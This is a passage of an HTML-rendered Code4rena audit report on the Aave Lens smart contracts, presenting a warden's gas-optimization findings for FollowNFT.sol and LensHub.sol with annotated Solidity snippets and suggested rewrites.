permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Gas Optimizations</h1>\n<p>For this contest, 12 reports were submitted by wardens detailing gas optimizations. The <a href=\"https://github.com/code-423n4/2022-02-aave-lens-findings/issues/47\">report highlighted below</a> by <strong>Dravee</strong> received the top score from the judge.</p>\n<p><em>The following wardens also submitted reports: <a href=\"https://github.com/code-423n4/2022-02-aave-lens-findings/issues/44\">IllIllI</a>, <a href=\"https://github.com/code-423n4/2022-02-aave-lens-findings/issues/56\">Jujic</a>, <a href=\"https://github.com/code-423n4/2022-02-aave-lens-findings/issues/41\">0x0x0x</a>, <a href=\"https://github.com/code-423n4/2022-02-aave-lens-findings/issues/17\">csanuragjain</a>, <a href=\"https://github.com/code-423n4/2022-02-aave-lens-findings/issues/74\">defsec</a>, <a href=\"https://github.com/code-423n4/2022-02-aave-lens-findings/issues/75\">nahnah</a>, <a href=\"https://github.com/code-423n4/2022-02-aave-lens-findings/issues/13\">d4rk</a>, <a href=\"https://github.com/code-423n4/2022-02-aave-lens-findings/issues/84\">rfa</a>, <a href=\"https://github.com/code-423n4/2022-02-aave-lens-findings/issues/83\">pauliax</a>, <a href=\"https://github.com/code-423n4/2022-02-aave-lens-findings/issues/79\">gzeon</a>, and <a href=\"https://github.com/code-423n4/2022-02-aave-lens-findings/issues/39\">0x1f8b</a>.</em></p>\n<h2 id=\"table-of-contents\" style=\"position:relative;\"><a href=\"#table-of-contents\" aria-label=\"table of contents permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Table of Contents</h2>\n<p>See <a href=\"https://github.com/code-423n4/2022-02-aave-lens-findings/issues/47\">original submission</a>.</p>\n<h2 id=\"foreword\" style=\"position:relative;\"><a href=\"#foreword\" aria-label=\"foreword permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Foreword</h2>\n<ul>\n<li><strong><code>@audit</code> tags</strong></li>\n</ul>\n<blockquote>\n<p>The code is annotated at multiple places with <code>//@audit</code> comments to pinpoint the issues. Please, pay attention to them for more details.</p>\n</blockquote>\n<h2 id=\"file-follownftsol\" style=\"position:relative;\"><a href=\"#file-follownftsol\" aria-label=\"file follownftsol permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>File: FollowNFT.sol</h2>\n<h3 id=\"function-getpowerbyblocknumber\" style=\"position:relative;\"><a href=\"#function-getpowerbyblocknumber\" aria-label=\"function getpowerbyblocknumber permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>function getPowerByBlockNumber()</h3>\n<h4 id=\"unchecked-block\" style=\"position:relative;\"><a href=\"#unchecked-block\" aria-label=\"unchecked block permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Unchecked block</h4>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"17\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">116:         if (snapshotCount == 0) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">117:             return 0; // Returning zero since this means the user never delegated and has no power</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">118:         }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">119: </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">120:         uint256 lower = 0;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">121:         uint256 upper = snapshotCount - 1; //@audit uncheck (see condition L116)</span></span></code></pre>\n<p>As it’s impossible for line 121 to underflow (see condition line 116), it should be wrapped inside an <code>unchecked</code> block.</p>\n<h3 id=\"function-getdelegatedsupplybyblocknumber\" style=\"position:relative;\"><a href=\"#function-getdelegatedsupplybyblocknumber\" aria-label=\"function getdelegatedsupplybyblocknumber permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>function getDelegatedSupplyByBlockNumber()</h3>\n<h4 id=\"unchecked-block-1\" style=\"position:relative;\"><a href=\"#unchecked-block-1\" aria-label=\"unchecked block 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Unchecked block</h4>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"18\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">158:         if (snapshotCount == 0) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">159:             return 0; // Returning zero since this means a delegation has never occurred</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">160:         }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">161: </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">162:         uint256 lower = 0;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">163:         uint256 upper = snapshotCount - 1; //@audit uncheck (see condition line 158)</span></span></code></pre>\n<p>As it’s impossible for line 163 to underflow (see condition line 158), it should be wrapped inside an <code>unchecked</code> block.</p>\n<h2 id=\"file-lenshubsol\" style=\"position:relative;\"><a href=\"#file-lenshubsol\" aria-label=\"file lenshubsol permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>File: LensHub.sol</h2>\n<h3 id=\"modifier-onlywhitelistedprofilecreator-\" style=\"position:relative;\"><a href=\"#modifier-onlywhitelistedprofilecreator-\" aria-label=\"modifier onlywhitelistedprofilecreator  permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>modifier onlyWhitelistedProfileCreator() {</h3>\n<h4 id=\"a-modifier-used-only-once-can-get-inline-to-save-gas\" style=\"position:relative;\"><a href=\"#a-modifier-used-only-once-can-get-inline-to-save-gas\" aria-label=\"a modifier used only once can get inline to save gas permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>A modifier used only once can get inline to save gas</h4>\n<p>The <code>modifier onlyWhitelistedProfileCreator</code> is used only once:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"19\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">File: LensHub.sol</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">142:     function createProfile(DataTypes.CreateProfileData calldata vars)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">143:         external</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">144:         override</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">145:         whenNotPaused</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">146:         onlyWhitelistedProfileCreator</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">147:     {</span></span></code></pre>\n<p>Therefore, it can get inlined in <code>createProfile</code> to save gas</p>\n<h3 id=\"function-setstate\" style=\"position:relative;\"><a href=\"#function-setstate\" aria-label=\"function setstate permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>function setState()</h3>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"20\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">95:     function setState(DataTypes.ProtocolState newState) external override {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">96:         if (msg.sender != _governance &amp;&amp; msg.sender != _emergencyAdmin) //@audit gas: this is a sad path with always 2 SLOADs. There&#39;s a happy path.</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">97:             revert Errors.NotGovernanceOrEmergencyAdmin();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">98:         _setState(newState);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">99:     }</span></span></code></pre>\n<h4 id=\"short-circuiting-can-provide-a-happy-path\" style=\"position:relative;\"><a href=\"#short-circuiting-can-provide-a-happy-path\" aria-label=\"short circuiting can provide a happy path permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Short-circuiting can provide a happy path</h4>\n<p>The current implementation of function <code>setState</code> favors a <strong>sad path</strong> which will always cost <strong>2 SLOADs</strong> to check the condition.\nIt’s possible to <strong>short-circuit</strong> this condition to provide a <strong>happy path</strong> which may cost <strong>only 1 SLOAD</strong> instead.\nI suggest rewriting the function to:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"21\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">    function setState(DataTypes.ProtocolState newState) external override {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        if (msg.sender == _governance || msg.sender == _emergencyAdmin) { //@audit-info happy path. Use as 1st condition the most frequent one (here, we assume _governance calls this method the most often)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">          _setState(newState);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        } else {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">          revert Errors.NotGovernanceOrEmergencyAdmin();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span></code></pre>\n<p>Another alternative:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"22\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">    function setState(DataTypes.ProtocolState newState) external override {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        if (msg.sender == _governance || msg.sender == _emergencyAdmin) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">          _setState(newState);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">          return;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        revert Errors.NotGovernanceOrEmergencyAdmin();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span></code></pre>\n<h3 id=\"function-getprofileidbyhandle\" style=\"position:relative;\"><a href=\"#function-getprofileidbyhandle\" aria-label=\"function getprofileidbyhandle permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>function getProfileIdByHandle()</h3>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"23\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">794:     function getProfileIdByHandle(string calldata handle) external view override returns (uint256) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">795:         bytes32 handleHash = keccak256(bytes(handle)); //@audit gas: var used only once, inline it</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">796:         return _profileIdByHandleHash[handleHash];</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">797:     }</span></span></code></pre>\n<h4 id=\"a-variable-used-only-once-shouldnt-get-cached\" style=\"position:relative;\"><a href=\"#a-variable-used-only-once-shouldnt-get-cached\" aria-label=\"a variable used only once shouldnt get cached permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>A variable used only once shouldn’t get cached</h4>\n<p>I suggest inlining <code>handleHash</code> L796.</p>\n<h3 id=\"function-_createpost\" style=\"position:relative;\"><a href=\"#function-_createpost\" aria-label=\"function _createpost permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>function _createPost()</h3>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"24\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">856:     function _createPost(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">857:         uint256 profileId,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">858:         string memory contentURI, //@audit gas: should be calldata (calls L333 and L374 are passing a calldata variable)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">859:         address collectModule,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">860:         bytes memory collectModuleData, //@audit gas: should be calldata (calls L335 and L376 are passing a calldata variable)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">861:         address referenceModule,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">862:         bytes memory referenceModuleData //@audit gas: should be calldata (calls L337 and L378 are passing a calldata variable)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">863:     ) internal {</span></span></code></pre>\n<h4 id=\"use-calldata-instead-of-memory-for-string-contenturi\" style=\"position:relative;\"><a href=\"#use-calldata-instead-of-memory-for-string-contenturi\" aria-label=\"use calldata instead of memory for string contenturi permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Use <code>calldata</code> instead of <code>memory</code> for <code>string contentURI</code></h4>\n<h4 id=\"use-calldata-instead-of-memory-for-bytes-collectmoduledata\" style=\"position:relative;\"><a href=\"#use-calldata-instead-of-memory-for-bytes-collectmoduledata\" aria-label=\"use calldata instead of memory for bytes collectmoduledata permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Use <code>calldata</code> instead of <code>memory</code> for <code>bytes collectModuleData</code></h4>\n<h4 id=\"use-calldata-instead-of-memory-for-bytes-referencemoduledata\" style=\"position:relative;\"><a href=\"#use-calldata-instead-of-memory-for-bytes-referencemoduledata\" aria-label=\"use calldata instead of memory for bytes referencemoduledata permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Use <code>calldata</code> instead of <code>memory</code> for <code>bytes referenceModuleData</code></h4>\n<p>For the 3 <code>memory</code> variables declared in <code>_createPost()</code>, the parent functions are actually passing a <code>calldata</code> variable:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"25\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">329:     function post(DataTypes.PostData calldata vars) external override whenPublishingEnabled { //@audit-info vars is using calldata</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">330:         _validateCallerIsProfileOwnerOrDispatcher(vars.profileId);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">331:         _createPost(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">332:             vars.profileId,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">333:             vars.contentURI, //@audit-info calldata</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">334:             vars.collectModule,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">335:             vars.collectModuleData, //@audit-info calldata</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">336:             vars.referenceModule,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">337:             vars.referenceModuleData //@audit-info calldata</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">338:         );</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">339:     }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">...</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">342:     function postWithSig(DataTypes.PostWithSigData calldata vars) //@audit-info vars is using calldata</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">343:         external</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">344:         override</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">345:         whenPublishingEnabled</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">346:     {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">...</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">372:         _createPost(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">373:             vars.profileId,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">374:             vars.contentURI, //@audit-info calldata</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">375:             vars.collectModule,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">376:             vars.collectModuleData, //@audit-info calldata</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">377:             vars.referenceModule,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">378:             vars.referenceModuleData //@audit-info calldata</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">379:         